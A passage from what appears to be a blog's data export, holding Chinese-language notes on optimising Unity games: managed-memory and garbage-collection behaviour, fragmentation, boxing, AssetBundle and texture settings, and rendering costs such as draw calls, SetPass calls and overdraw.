Unity - Unity Learn</a></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"Unity-Managed-Memory-优化用户管理内存\"><a href=\"#Unity-Managed-Memory-优化用户管理内存\" class=\"headerlink\" title=\"Unity Managed Memory 优化用户管理内存\"></a>Unity Managed Memory 优化用户管理内存</h4><p><a href=\"https://docs.unity3d.com/Manual/BestPracticeUnderstandingPerformanceInUnity4-1.html\" target=\"_blank\" rel=\"noopener\">Understanding the managed heap</a></p>\n<ul>\n<li><p>VM 内存池</p>\n<ul>\n<li>mono 虚拟机的内存池</li>\n<li>VM 会返还内存给 OS 吗？<ul>\n<li><strong>会</strong></li>\n</ul>\n</li>\n<li>返还条件是什么？<ul>\n<li>GC 不会把内存返还给系统</li>\n<li>内存也是以 Block 来管理的。当一个 Block 连续六次 GC 没有被访问到，这块内存才会被返还到系统。（mono runtime 基本看不到，IL2cpp runtime 可能会看到多一点）</li>\n</ul>\n</li>\n<li>不会频繁地分配内存，而是一次分配一大块。</li>\n</ul>\n</li>\n<li><p>GC 机制（BOEHM Non-generational 不分代的）</p>\n<ul>\n<li><p>GC 机制考量</p>\n<ul>\n<li>Throughput(（回收能力）<ul>\n<li>一次回收，会回收多少内存</li>\n</ul>\n</li>\n<li>Pause times（暂停时长）<ul>\n<li>进行回收的时候，对主线程的影响有多大</li>\n</ul>\n</li>\n<li>Fragmentation（碎片化）<ul>\n<li>回收内存后，会对整体回收内存池的贡献有多少</li>\n</ul>\n</li>\n<li>Mutator overhead（额外消耗）<ul>\n<li>回收本身有 overhead，要做很多统计、标记的工作</li>\n</ul>\n</li>\n<li>Scalability（可扩展性）<ul>\n<li>扩展到多核、多线程会不会有 bug</li>\n</ul>\n</li>\n<li>Protability（可移植性）<ul>\n<li>不同平台是否可以使用</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>BOEHM</p>\n<ul>\n<li><p>Non-generational（不分代的）</p>\n<p>  <img src=\"https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8934bc1f-3e98-4544-b6de-6ea5b80e2850/Untitled.png\" alt=\"https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8934bc1f-3e98-4544-b6de-6ea5b80e2850/Untitled.png\"></p>\n<ul>\n<li>分代是指：大块内存、小内存、超小内存是分在不同内存区域来进行管理的。还有长久内存，当有一个内存很久没动的时候会移到长久内存区域中，从而省出内存给更频繁分配的内存。</li>\n<li>“非代数”是不分代的,指必须扫描整个托管堆，因此在执行收集传递时必须扫描整个堆，因此其性能因堆的大小扩展而降低。</li>\n</ul>\n</li>\n<li><p>Non-compacting（非压缩式）</p>\n<p>  <img src=\"https://s3-us-west-2.amazonaws.com/secure.notion-static.com/33a4002e-f37e-4405-b9b3-815c0f43caba/Untitled.png\" alt=\"https://s3-us-west-2.amazonaws.com/secure.notion-static.com/33a4002e-f37e-4405-b9b3-815c0f43caba/Untitled.png\"></p>\n<ul>\n<li>当有内存被回收的时候，压缩内存会把上图空的地方重新排布。是指当释放的内存产生的间隙不会消失。也就是说对象被销毁，内存被释放，这块内存不会马上收集成为空闲内存的一部分，这块内存只能用来存储比释放对象相同或更小的数据，如果内存间隔太小，会产生内存碎片.即使可能有足够的总空间来容纳某个分配，托管堆也无法找到足够大的连续内存块来适合分配。</li>\n<li>但 Unity 的 BOEHM 不会！它是非压缩式的。空着就空着，下次要用了再填进去。<ul>\n<li>历史原因：Unity 和 Mono 合作上，Mono 并不是一直开源免费的，因此 Unity 选择不升级 Mono，与实际 Mono 版本有差距。</li>\n<li>下一代 GC<ul>\n<li>Incremental GC（渐进式 GC）<ul>\n<li>现在如果我们要进行一次 GC，主线程被迫要停下来，遍历所有 GC Memory “island”（没听清），来决定哪些 GC 可以回收。</li>\n<li>Incremental GC 把暂停主线程的事分帧做了。一点一点分析，主线程不会有峰值。总体 GC 时间不变，但会改善 GC 对主线程的卡顿影响。</li>\n</ul>\n</li>\n<li>SGen 或者升级 Boehm？<ul>\n<li>SGen 是分代的，能避免内存碎片化问题，调动策略，速度较快</li>\n</ul>\n</li>\n<li>IL2CPP<ul>\n<li>现在 IL2CPP 的 GC 机制是 Unity 自己重新写的，是升级版的 Boehm</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Memory fragmentation 内存碎片化</p>\n<p>  <img src=\"https://s3-us-west-2.amazonaws.com/secure.notion-static.com/96caa361-8d1a-4f8e-a0b6-87d521bb7f14/Untitled.png\" alt=\"https://s3-us-west-2.amazonaws.com/secure.notion-static.com/96caa361-8d1a-4f8e-a0b6-87d521bb7f14/Untitled.png\"></p>\n<ul>\n<li>为什么内存下降了，但总体内存池还是上升了？<ul>\n<li>因为内存太大了，内存池没地方放它，虽然有很多内存可用。（内存已被严重碎片化）</li>\n</ul>\n</li>\n<li>当开发者大量加载小内存，使用释放*N，例如配置表、巨大数组，GC 会涨一大截。<ul>\n<li>建议先操作大内存，再操作小内存，以保证内存以最大效率被重复利用。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p>Zombie Memory（僵尸内存）</p>\n<ul>\n<li>内存泄露说法是不对的，内存只是没有任何人能够管理到，但实际上内存没有被泄露，一直在内存池中，被 zombie 掉了，这种叫 Zombie 内存。</li>\n<li>无用内容<ul>\n<li>Coding 时候或者团队配合的时候有问题，加载了一个东西进来，结果从头到尾只用了一次。</li>\n<li>有些开发者写了队列调度策略，但是策略写的不好，导致一些他觉得会被释放的东西，没有被释放掉。</li>\n<li>找是否有活跃度实际上并不高的内存。</li>\n</ul>\n</li>\n<li>没有释放</li>\n<li>通过代码管理和性能工具分析</li>\n</ul>\n</li>\n<li><p>最佳实践</p>\n<ul>\n<li>Don’t Null it, but Destroy it（显式用 Destory，别用 Null）</li>\n<li>Class VS Struct,尽量用 Struct</li>\n<li>Pool In Pool（池中池）<ul>\n<li>VM 本身有内存池，但建议开发者对高频使用的小部件，自己建一个内存池。例如子弹等,高频使用的小部件。</li>\n</ul>\n</li>\n<li>Closures and anonymous methods（闭包和匿名函数）<ul>\n<li>如果看 IL，所有匿名函数和闭包会 new 成一个 class，因此所有变量和要 new 的东西都是要占内存的。这样会导致协程。<ul>\n<li>有些开发者会在游戏开始启用一个协程，直到游戏结束才释放，这是错误的。</li>\n<li>只要协程不被释放掉，所有内存都会在内存里,在协程里面的内存,只要协程不被释放,则会一直在内存里面。</li>\n<li>用的时候生产一个协程,不用的时候就释放,这是最好的使用协程的方式</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>Coroutines（协程）<ul>\n<li>可看做闭包和匿名函数的一个特例</li>\n<li>最佳实践：用的时候生产一个，不用的时候 destroy 掉。</li>\n</ul>\n</li>\n<li>Configurations（配置表）<ul>\n<li>不要把整个配置表都扔进去，是否能通过啥来切分下配置表</li>\n</ul>\n</li>\n<li>Singleton<ul>\n<li>慎用,严格检查使用.</li>\n<li>有些内存从游戏一开始到游戏死掉，一直在内存中。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"优化重点以及方向\"><a href=\"#优化重点以及方向\" class=\"headerlink\" title=\"优化重点以及方向\"></a>优化重点以及方向</h1><p>unity托管内存&gt;第三方库(主要是lua优化)&gt;unity底层优化&gt;代码文件.</p>\n<h4 id=\"unity托管内存-用户管理内存\"><a href=\"#unity托管内存-用户管理内存\" class=\"headerlink\" title=\"unity托管内存(用户管理内存)\"></a>unity托管内存(用户管理内存)</h4><ul>\n<li>c# 一共有几种类型:一共有四类<blockquote>\n<p>1 值类型。在C#中，所有从System.ValueType继承的类型.bool;byte;char;decimal;double;enum;float;int;long;sbyte;short;ushort;uint;ulong;struct<br>2 引用类型。类、接口、委托、object对象;string;stringBuilder;class;interface;delegate<br>3 指针。当我们把对象放到堆内存时，访问该对象，就需要一个指向该对象的引用，也就是指针,我们不需要显式的使用指针，Clr会对引用进行管理;注意区别指针(引用)与引用类型的区别，当我们说类型是引用类型时，指的是它需要通过指针来访问;而指针存储着一个指向内存的地址。<br>4 指令。处理指令，比如变量声明、数学运算、跳转等</p>\n</blockquote>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>对比参数</th>\n<th>值类型</th>\n<th>引用类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>内存分配(管理)</td>\n<td>线程栈</td>\n<td>托管堆</td>\n</tr>\n<tr>\n<td>内存回收</td>\n<td>直接释放</td>\n<td>等待 GC (垃圾回收器)回收</td>\n</tr>\n<tr>\n<td>new实例</td>\n<td>返回值本身</td>\n<td>返回内存地址，如果垃圾回收器第0代内存满时，可能引起垃圾回收</td>\n</tr>\n<tr>\n<td>变量赋值</td>\n<td>逐字段复制</td>\n<td>赋值内存地址</td>\n</tr>\n<tr>\n<td>类型特点</td>\n<td>轻量、无额外字段</td>\n<td>需要额外字段（类型地址指针、同步块索引）</td>\n</tr>\n<tr>\n<td>常见类型</td>\n<td>数值类型、枚举类型、struct类型</td>\n<td>string、clas类</td>\n</tr>\n<tr>\n<td>是否支持继承</td>\n<td>值类型都是密封类型，所以不支持继承</td>\n<td>单继承</td>\n</tr>\n<tr>\n<td>接口实现</td>\n<td>支持</td>\n<td>支持</td>\n</tr>\n<tr>\n<td>表现方式</td>\n<td>未装箱、已装箱</td>\n<td>总是已装箱</td>\n</tr>\n</tbody></table>\n<ul>\n<li><p>栈的主要功能是什么？</p>\n<blockquote>\n<p>栈的主要功能是跟踪线程执行时的代码指针的位置，以及被调用和返回的数据,可以把它看做一个线程的状态，每个线程都有自己独立的栈。<br>当调用函数时，会将函数的参数压入线程栈，在方法内的局部变量也会压入线程栈顶。方法执行结束后， 返回值被返回。C++中也是一样的</p>\n</blockquote>\n</li>\n<li><p>怎么确定数据分配到了哪个内存区？怎么确定数据分配在栈还是堆上？</p>\n<blockquote>\n<p>值类型和指针总分配在被声明的地方，即他们的分配与声明的位置有关，声明在哪儿就分配在哪儿<br>非空引用类型对象和所有装箱值类型对象总是分配在堆内存上;严格来说，必须在托管堆上分配所有非 null 引用类型对象和所有装箱值类型对象<br>栈内存由当前线程管理,堆内存由 GC 管理</p>\n</blockquote>\n</li>\n<li><p>值类型一定分配在栈上吗？</p>\n<blockquote>\n<p>不是,如果声明在函数的局部变量，就分配到线程栈中；如果声明在一个class类中，就分配在堆内存中</p>\n</blockquote>\n</li>\n<li><p>垃圾回收是如何工作的？垃圾回收的执行过程是什么样的？</p>\n<blockquote>\n<p>1.当GC开始调用时，挂起所有正在运行的线程<br>2.检查堆上的每个对象,回收线程会检查内存堆<br>3.搜索当前对象的所有引用<br>4.没有被引用的对象都是垃圾，被标记为可删除<br>5.最后遍历删除被标记为可删除的对象，释放内存<br>6.最后GC会对剩下的对象进行重定位，同时会更新所有指向这些对象的指针（引用）。这一系列操作在性能消耗方面非常昂贵，所以在编写高性能代码时，要注意栈和堆得内存分配。</p>\n</blockquote>\n</li>\n<li><p>什么情况会触发垃圾回收？</p>\n<blockquote>\n<p>代码需要在托管堆上分配内存时，但发现可分配的空间不足的情况下会触发GC<br>手动代码调用触发GC<br>Unity不定期的触发GC</p>\n</blockquote>\n</li>\n<li><p>内存碎片的现象会造成什么问题？</p>\n<blockquote>\n<p>1:堆内存是一块连续的内存地址，清理其中垃圾之后，就会造成内存碎片。<br>2:内存间隔太小不够放新的对象<br>3:一个托管堆虽然总空间量已经很大了，但是在这个空间里的内存间隔找不到连续空间来存储新的对象.<br>4:如果有内存压缩的 GC 机制,内存碎片就会被清空还给系统,最新版的 Unity 会添加内存压缩的 GC 机制,目前应该在筹备中</p>\n</blockquote>\n</li>\n<li><p>unity什么时候会给堆内存扩容？</p>\n<blockquote>\n<p>如果unity发现托管堆的内存不够分配了，会先进行GC，如果GC之后，发现还是不够分配，就进行托管堆的扩容（扩展），堆扩展的具体数量取决于平台; 但是，大多数Unity平台的大小都是托管堆的两倍。<br>开始分配–&gt;检查托管堆上是否有足够的可分配内存,有就给变量分配内存;没有就触发 Unity 的 GC(垃圾回收)–&gt;检查托管对上是否有足够的可分配内存–&gt;有就给变量分配内存;没有,Unity 就向操作系统申请新的内存(扩充托管对的大小)–&gt;有就给变量分配内存;没有就干掉后台的其他 APP,在没有就再干掉系统服务等等,在没有就杀掉当前 APP</p>\n</blockquote>\n</li>\n<li><p>从代码上有哪些写法是可以避免内存碎片产生的？</p>\n<blockquote>\n<p>不要在频繁调用的函数中反复进行堆内存分配,在像Update()和LateUpdate()这种每帧都调用的函数，可以判断值变化了才调用某个会有堆内存分配的函数，或者计时器到了才调用某个函数<br>清空而不是创建集合,创建新的集合(比如：数组，字典，链表等集合类数据)会导致托管堆上的内存分配 , 如果发现在代码中不止一次地创建新集合，那么我们应该缓存引用到的集合，并使用Clear()清空其内容，而不是重复调用new()<br>尽可能避免C＃中的闭包。在性能敏感的代码中应该尽可能的减少匿名方法和方法引用的使用，尤其是在基于每帧执行的代码中。匿名方法要求该方法能够访问方法范围之外的变量状态，因此已成为闭包。于是C＃通过生成一个匿名类，可以保留闭包所需的外部范围变量。当执行闭包需要实例化其生成的类的副本，并且所有类都是C＃中的引用类型，所以执行闭包需要在托管堆上分配对象。<br>装箱;装箱是Unity中非常常见的非预期的临时内存分配原因之一。只要将值类型值用作引用类型，就会发生这种情况;C＃的IDE和编译器通常不会发出有关装箱的警告，即使它会导致意外的内存分配。这是因为C＃语言是在假设小型临时分配将由分代垃圾收集器和分配大小敏感的内存池有效处理的情况下开发的。虽然Unity的分配器确实使用不同的内存池进行小型和大型分配，但Unity的垃圾收集器是不是分代的，因此不能有效地扫除由装箱生成的小的，频繁的临时分配。在用Unity运行时编写C＃代码时，应尽可能避免使用装箱操作。装箱的一个常见原因是使用enum类型作为词典的键。要解决这个问题，有必要编写一个实现IEqualityComparer接口的自定义类，并将该类的实例指定为Dictionary的比较器;Unity 5.5中的C＃编译器升级显着提高了Unity生成IL的能力。已经从foreach循环中消除了装箱操作。消除了与foreach循环相关的内存开销。(<a href=\"https://blog.csdn.net/salvare/article/details/79935578\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/salvare/article/details/79935578</a>)<br>String相关;在C#中，String字符串是引用类型而不是值类型。C#中的字符串是不可变更的，其引用指向的值在创建后是不可被变更的。因此在创建或者丢弃字符串的时候，会造成托管堆内存分配。推荐做法：减少不必要的字符串创建，提前创建并持有缓存;减少不必要的字符串操作，比如常用的+。每次在对字符串进行操作的时候（例如运用字符串的”+”操作），unity会新建一个字符串用来存储相加后的字符串。然后使之前的旧字符串被标记为废弃，成为内存垃圾。改用StringBuilder类 , StringBuilder就是专门设计用来创建字符串而不产生额外托管堆分配的类，而且可以避免字符串拼接产生垃圾<br>注意由于调用Unity的API所造成的堆内存分配;如果函数需要返回一个数组，则一个新的数组会被创建用作结果返回，简单地缓存一个对数组的引用;函数gameobject.name或gameobject.tag，可以使用一个相关的联合函数。用Input.GetTouch()和Input.touchCount()来代替Input.touches或者用Physics.SphereCastNonAlloc()来代替Physics.SphereCastAll();mesh.vertices 每次调用也是会造成开销的.</p>\n</blockquote>\n</li>\n<li><p>unity的mono堆内存分配后会返还给系统吗？</p>\n<blockquote>\n<p>不会，目前Unity所使用的Mono版本存在一个很严重的问题，Mono的堆内存是只升不降。<br>新一代版本会返回给系统,IL2CPP 版本的也会返回</p>\n</blockquote>\n</li>\n</ul>\n<p>VM : mono的一个VM内存池,虚拟机的内存池.VM内存会返回内存给OS内存,当一块内存 GC 6次没有被访问到,就会将内存放回给OS<br>GC :<br><a href=\"https://www.cnblogs.com/nele/p/5673215.html\" target=\"_blank\" rel=\"noopener\">分代式内存回收</a><br>GC机制考量,<br>Throughput(回收能力):一次GC会回收到多少内存<br>pause times(暂停时长):一次GC对主线程影响多大,会让主线程暂停多少毫秒<br>Fragmentation(碎片化):一次GC内存回收之后,会让整块内存的碎片化增加多少,即不连续内存会增加多少.<br>Mutator overhead(额外消耗):回收本身有消耗,需要考量这个消耗有多大.<br>Soalability(可扩展性):多核多线程时会不会有其他bug<br>Portability(可移植性):在其他平台上面是否可以移植</p>\n<p>目前GC:<br>unity现在使用的是:Boehm(Non-generational)非分代式,(Non-compaction)非压缩方式,内存回收机制,是所有内存同一放在一起的.造成主线程的卡顿</p>\n<ul>\n<li>下一代GC:<ul>\n<li>Incremental GC(渐进式GC),分帧去做GC回收,GC时长还是一样的,但是会避免系统卡顿;目前已转向IL2CPP(升级的Boehm)了.</li>\n</ul>\n</li>\n</ul>\n<ul>\n<li>问题:内存下降,但是总体的内存池还是上升了,为什么?<ul>\n<li>是代码碎片化导致的.因为有一块内存一直插不进去当前内存池里面,只能另行开辟内存.也就是内存碎片化没有被压缩.优化建议,先去对大型内存创建和释放,再对小型内存进行创建和释放.</li>\n<li>Zimbie Memory(僵尸内存,别名就叫做脏内存,无用内存) :指内存从开启游戏到游戏关闭只用了一次内存.没有被释放,内存也没有泄露,也没办法使用.内存泄漏指得是没有任何人可以访问和管理到它,也没法释放掉.优化建议:不要觉得 obj == null就是释放掉内存了,显示调用destroy方法才可以释放掉.</li>\n<li>要常用struct不要用class</li>\n<li>Pool In Pool (池中池) 高频使用的小部件需要建立一个内存池,不要频繁的去创建销毁Closures and anonymous methods (闭包和匿名函数,协程) 这些东西最终在C++层全部new成一个class了,优化建议:不要用.关于协程的优化建议:用的时候创建,及时销毁.再用时,再创建,再销毁.</li>\n<li>配置表优化,优化建议,采用C++管理内存,使用C#接口以及Lua接口去查询,而不是在c#和Lua里面保存内存,不要在c#和Lua里面重新全部记录.例如:从C++接过配置表对象时,在c#里面再保存一份,这是错误的方式.</li>\n<li>Singleton 单例慎用,仅在必要时用,最好不要用单例模板,太坑爹的设计了,难用不说还特么代码难看懂,恶心.</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"第三方库-主要是lua优化-–-gt\"><a href=\"#第三方库-主要是lua优化-–-gt\" class=\"headerlink\" title=\"第三方库(主要是lua优化)–&gt;\"></a>第三方库(主要是lua优化)–&gt;</h4><ul>\n<li>需要查看tolua源码以及C++基础,然后在tolua的基础上面做优化,需要的个人能力比较强.<br>以及使用C++库作为插件导入进unity里面使用.</li>\n</ul>\n<h4 id=\"unity底层代码优化方向–-gt\"><a href=\"#unity底层代码优化方向–-gt\" class=\"headerlink\" title=\"unity底层代码优化方向–&gt;\"></a>unity底层代码优化方向–&gt;</h4><p>底层会根据类型将内存分配到不同的Allooator的池子里面,使用GetRuntimeMemory<br>profiler中Memory一项中的Used Total 和 Reserved Total会保持相同的上升或者下降,如果不一致,那就是出bug了.<br>Used Total 表示当前你使用了多少内存<br>Reserved Total表示unity申请了多少内存,将要使用到的内存<br>1: Scene中的GameObject太多,则内存会暴涨.如果在场景中创建了一个GameObject,底层C++会创建一个或者多个object(记录component),去记录这个GameObject的信息.是程序的优化重点,建议:尽量少创建GameObject,并且无用GameObject尽量干掉,优化GameObject个数.<br>2: Audio中会有个缓存池(DSP buffer),需要用户设置,填充满就会向CPU发送播放指令,发送完播放指令才会播放.设置的过大,则音频填充满就会时间过长,声音延迟,设置的过小,就会向CPU频繁发送.优化建议:测试音频播放密集时与不密集时的样本,并进行大小变换设置.<br>Force to mono,双声道音频设置,双声道概念:左右声道播放的不一致的声音.优化建议,设置为单声道.<br>音频格式Format,Mac/iOS上面的音频设置为mp3,有硬件支持.<br>音频压缩格式Compression Format:在哪种情况下使用哪种形态,需要去unity官方手册上面查询.<br>3: CodeSize,模板泛型的乱用,会导致打包速度,并且静态代码量增多.模板泛型,(il2cpp)会在C++层将泛型全部转成静态类型的C++,会变的很大.(一个文件2-3m已经很多了吧,官方视频上说有25M!  …)<br>4: AssetBundle<br>typetree,序列化的时候会生成一个typetree,反序列化的时候会根据这个typetree反序列化.<br>关闭typetree内存会减小,包大小会减小,build和运行时会变快.<br>Lz4 压缩方式,快速压缩,包体大Lzma上面30%,不要用Lzma,lzma会增大内存等等副作用.<br>asset会有头记录部分,以及实际的数据部分,如果每一个都打成ab则有可能发生,头记录部分比实际数据部分还要大,建议是1-2M,5G以后可以加大.<br>5:Resource 文件夹 ,打进包的时候会做一个红黑树(R-B Tree),会检索数据在什么位置,这个里面的数据很大,则红黑树就会很大.优化建议:不要放大量数据就行了,用ab替换.<br>6:Texture<br>upload buffer 这个数据表示填满之后向GPU发送一次,建议测试并平均该值<br>R/W read and write 一般情况下不要开,开启情况会在显存和内存中各一份.<br>mip maps UI情况下不要开就行了.<br>7: mesh<br>R/W 一般情况下不要开. compression在某些unity版本上面开了比不开占用更多内存.</p>\n<h6 id=\"tips-加快Unity编辑器下脚本编译速度\"><a href=\"#tips-加快Unity编辑器下脚本编译速度\" class=\"headerlink\" title=\"tips:加快Unity编辑器下脚本编译速度\"></a>tips:<a href=\"https://www.xuanyusong.com/archives/4474\" target=\"_blank\" rel=\"noopener\">加快Unity编辑器下脚本编译速度</a></h6><p>创建与加载monobehavier以后，内存中有大量这种东西，内存中是没有做过优化的，内存结构不合理，不够紧凑，分散点比较多，cpu也没有将这些事情并行处理，monobehavier里面的方法还是有反射到c++层使用的</p>\n<hr>\n<h1 id=\"C-与非托管DLL进行交互\"><a href=\"#C-与非托管DLL进行交互\" class=\"headerlink\" title=\"C#与非托管DLL进行交互\"></a>C#与非托管DLL进行交互</h1><p><a href=\"https://blog.csdn.net/salvare/article/details/80087488\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/salvare/article/details/80087488</a></p>\n<h1 id=\"Unity内存管理的核心问题\"><a href=\"#Unity内存管理的核心问题\" class=\"headerlink\" title=\"Unity内存管理的核心问题\"></a>Unity内存管理的核心问题</h1><ul>\n<li>1:内存使用是否合适? 内存块大小,碎片化.</li>\n<li>2:内存泄露如何解决? 僵尸内存</li>\n<li>3:Reserved Total 内存总量尽量小于80M</li>\n<li>4:纹理资源内存尽量小于 50M,</li>\n<li>5:网格资源内存尽量小于 20M,模型的 Tangents 尽量选择 None</li>\n<li>6:RenderTexture 内存峰值,需要控制分辨率,需要关注 Antialiasing(反锯齿)</li>\n<li>7:ParticleSystem 粒子系统总体使用数量</li>\n<li>8:AssetBundle资源冗余,如何做到零冗余–&gt;<a href=\"https://blog.uwa4d.com/archives/1577.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/1577.html</a></li>\n<li>9:AssetBundle(SerializedFile)尽量小于 50 个</li>\n<li>10:关注一次性分配过多内存,关注哪个函数在分配内存.配表解析,New Class,String 操作,Instantiate,格式转换</li>\n<li>11:内存泄露,每1000 帧需要获取一下堆内存和变量数.</li>\n</ul>\n"},{"title":"Unity 渲染优化","date":"2020-05-08T03:41:32.000Z","_content":"\n\n# Draw Call\n* setPass Calls: pass 指的是 shader 里面的 pass 代码块;setPass表示材质切换(避免出现 Material Instance);setPass Calls指的是在运行期间,经过了多少次的材质切换;setPass Calls小于或者远小于 Draw Calls/Total Batches 的.当粒子停止播放,但是没有 Deactive 的情况下,引擎还是会画(setPass Calls增加),但是什么都没有画出来(Draw Calls 为 0).\n* Batches : 非常重要,在 Frame Debug 里面可以看到当前帧画出的数据,所有右边的值加载一起,就是总量.动态合批,静态合批,字体 Mesh,图片 Mesh 等\n* Draw Calls : 与Batches是不相同的,但是这个值目前大部分是与 DrawCalls 相同的,但是这个值一定等于 OpenGL 调用 glDrawElements 的次数,最好的情况下就是一个Batches方法的调用栈里面只有一次glDrawElements方法\n* https://github.com/Unity-Technologies/BatchBreakingCause 该项目说明了为什么不能合批的原因,以及做法\n\n# RenderState\n* RenderState 切换 \n* Unity5.5 版本之前有一个 Material.SetPassFast 的方法,表示渲染状态切换.\n* 避免过多的 Instance Material 生成,也就是一个材质被改变了里面的参数,导致当前的Material会变成 Material(Instance),多出来一份甚至几份.使用 MaterialPropertyBlock 功能,https://blog.uwa4d.com/archives/1983.html;       \n* Texture2DArray:相同 size/format/flags ,适合场景中存在的大量,多次采样的同种材质,比如:大量同种PBR 材质的怪物,潜在有点事降低 DrawCall;网格不必相同,只需要可以传递参数到 shader 中即可,比如在uv,color 等属性上记录;后续在 UI,大规模场景渲染中具备很大的发挥潜力\n\n\n\n\n# 填充率(FillRate)\n##### OverDraw\n* 检查标准,总填充数,平均填充倍数,单像素最大填充数(某一帧,某一点上面,过量的填充,比如粒子特效).\n* 半透明区域像素在一帧中被渲染多遍,UI 界面,粒子特效.全屏 UI,可以尝试 Deavtive 主场景的(背后场景的,其他的) Camera; 半屏 UI,可以根据需求将主场景(背后的场景,其他的场景)渲染成背景 RT;\n* mask 组件的 overdraw,使用 Rect Mask; \n* 使用 Empty Click UI,空纹理检测点击,无渲染;\n* 对常驻的粒子特效,比如烟雾,使用插件 OffScreen Particle Rendering \n* Scene View 里面可以看到 Overdraw 不透明也可以叠加,可能不准确,但是足够,使用的方式是 Shader Replacement 做的;透明图片,4 层之后会降低帧率\n* 天空盒肯定会先画一遍;Over Shading 出现在小面积或者狭长 Triangle 渲染时,GPU 并不是单像素采样,而是 2x2 方形采样;\n\n##### Over Shading 过着色\n* 出现在小面积或狭长 Triangle 渲染时.三角形占用 4 个像素,但是 GPU 画图时,会一次性画很多像素,其他画出的像素就浪费性能.\n* 找到使用率低的 Mesh,进行线下简化\n* Level Of Detail,进行实时简化\n##### 网格资源渲染密度分析\n* 渲染网格模型在每单位像素中,网格顶点的渲染数量\n* 渲染网格模型平均每帧的渲染像素值\n\n# 带宽(Bandwidth)\n\n# Shader复杂度(ALU)\n\n\n# 后期处理效果\n\n* 1:屏幕区域后效区分化(不同区域强度差异),特效,角色,天空,互相映照会影响彼此,需要区分.\n* 2:Distort 效果兼容(需要 Grad)\n* 3:不同对象后效的去分化处理,同一对象不同部位区分化\n* 4:Blit 带宽性能瓶颈\n* 5:Stencil buffer 在 OnRenderImage 之前会被 Clear,依赖 Depth Buffer\n\n# 问题出在哪里?\n* 不透明物体的渲染\n```\nMeshRenderer.Render 非蒙皮网格渲染\nMesh.DrawVBO        Draw Call\nMeshSkinning.Render 蒙皮网格渲染\nMaterial.SetPassFast 设置渲染状态. 调用次数与材质数目成正比,与批次成正比,是在每次提交 Draw Call之前,修改 Render State(混合,深度测试等)\n对于不透明物体的渲染,进行优化,需要:减少 Draw Call,减少材质,减少面片数.\n对于不透明物体的耗时:与物体个数(Draw Call)成正比,与单个物体面片数不敏感,与场景中使用材质数目成正比;对于 CPU 端耗时的影响程度:物体个数>材质数据>单个物体面片数\n```\n* 半透明物体的渲染\n```\nMeshRenderer.Render 场景中半透明渲染\nMesh.DrawVBO        Draw Call\nMesh.CreateVBO      NGUI的消耗一般在这个地方\nParticleSystem.ScheduleGeometryJobs    与在相机窗口内部的粒子系统个数成正比 >> 子线程调用ParticleSystem.GeometryJobs方法\nParticleSystem.SubmitVBO 粒子系统渲染\nBatchRenderer.Add   UGUI的消耗一般藏在这里\n对于粒子系统,进行优化,需要:减粒子系统个数,减粒子个数\n\n```","source":"_posts/Unity/Optimize/Unity渲染优化.md","raw":"---\ntitle: Unity 渲染优化\ndate: 2020-05-08 11:41:32\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---\n\n\n# Draw Call\n* setPass Calls: pass 指的是 shader 里面的 pass 代码块;setPass表示材质切换(避免出现 Material Instance);setPass Calls指的是在运行期间,经过了多少次的材质切换;setPass Calls小于或者远小于 Draw Calls/Total Batches 的.当粒子停止播放,但是没有 Deactive 的情况下,引擎还是会画(setPass Calls增加),但是什么都没有画出来(Draw Calls 为 0).\n* Batches : 非常重要,在 Frame Debug 里面可以看到当前帧画出的数据,所有右边的值加载一起,就是总量.动态合批,静态合批,字体 Mesh,图片 Mesh 等\n* Draw Calls : 与Batches是不相同的,但是这个值目前大部分是与 DrawCalls 相同的,但是这个值一定等于 OpenGL 调用 glDrawElements 的次数,最好的情况下就是一个Batches方法的调用栈里面只有一次glDrawElements方法\n* https://github.com/Unity-Technologies/BatchBreakingCause 该项目说明了为什么不能合批的原因,以及做法\n\n# RenderState\n* RenderState 切换 \n* Unity5.5 版本之前有一个 Material.SetPassFast 的方法,表示渲染状态切换.\n* 避免过多的 Instance Material 生成,也就是一个材质被改变了里面的参数,导致当前的Material会变成 Material(Instance),多出来一份甚至几份.使用 MaterialPropertyBlock 功能,https://blog.uwa4d.com/archives/1983.html;       \n* Texture2DArray:相同 size/format/flags ,适合场景中存在的大量,多次采样的同种材质,比如:大量同种PBR 材质的怪物,潜在有点事降低 DrawCall;网格不必相同,只需要可以传递参数到 shader 中即可,比如在uv,color 等属性上记录;后续在 UI,大规模场景渲染中具备很大的发挥潜力\n\n\n\n\n# 填充率(FillRate)\n##### OverDraw\n* 检查标准,总填充数,平均填充倍数,单像素最大填充数(某一帧,某一点上面,过量的填充,比如粒子特效).\n* 半透明区域像素在一帧中被渲染多遍,UI 界面,粒子特效.全屏 UI,可以尝试 Deavtive 主场景的(背后场景的,其他的) Camera; 半屏 UI,可以根据需求将主场景(背后的场景,其他的场景)渲染成背景 RT;\n* mask 组件的 overdraw,使用 Rect Mask; \n* 使用 Empty Click UI,空纹理检测点击,无渲染;\n* 对常驻的粒子特效,比如烟雾,使用插件 OffScreen Particle Rendering \n* Scene View 里面可以看到 Overdraw 不透明也可以叠加,可能不准确,但是足够,使用的方式是 Shader Replacement 做的;透明图片,4 层之后会降低帧率\n* 天空盒肯定会先画一遍;Over Shading 出现在小面积或者狭长 Triangle 渲染时,GPU 并不是单像素采样,而是 2x2 方形采样;\n\n##### Over Shading 过着色\n* 出现在小面积或狭长 Triangle 渲染时.三角形占用 4 个像素,但是 GPU 画图时,会一次性画很多像素,其他画出的像素就浪费性能.\n* 找到使用率低的 Mesh,进行线下简化\n* Level Of Detail,进行实时简化\n##### 网格资源渲染密度分析\n* 渲染网格模型在每单位像素中,网格顶点的渲染数量\n* 